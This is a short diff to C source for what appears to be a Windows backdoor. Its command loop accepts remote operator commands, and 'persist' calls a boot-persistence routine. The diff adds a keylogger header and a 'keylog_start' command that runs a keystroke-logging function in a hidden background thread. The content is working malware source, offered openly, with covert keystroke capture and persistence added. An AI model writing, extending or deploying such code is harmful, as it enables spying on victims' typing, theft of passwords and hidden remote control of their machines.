@@ -9,6 +9,7 @@
 #include <string.h> // string manipulation
 #include <sys/stat.h>
 #include <sys/types.h>
+#include "keylogger.h" // including library
 
 // memset equivalent for linux bzero
 #define bzero(p, size) (void) memset((p), 0, (size))
@@ -111,8 +112,11 @@ void shell() {
       chdir(str_cut(buffer, 3, 100));
     } else if(strncmp("persist", buffer, 7) == 0) {
       bootRun();
-    }
-    else {
+    } else if(strncmp("keylog_start", buffer, 12) == 0) {
+      // thread - process independently in the background
+      HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
+      goto jump;
+    } else {
       // file descriptors
       FILE *fp;
       // run as process - run buffer
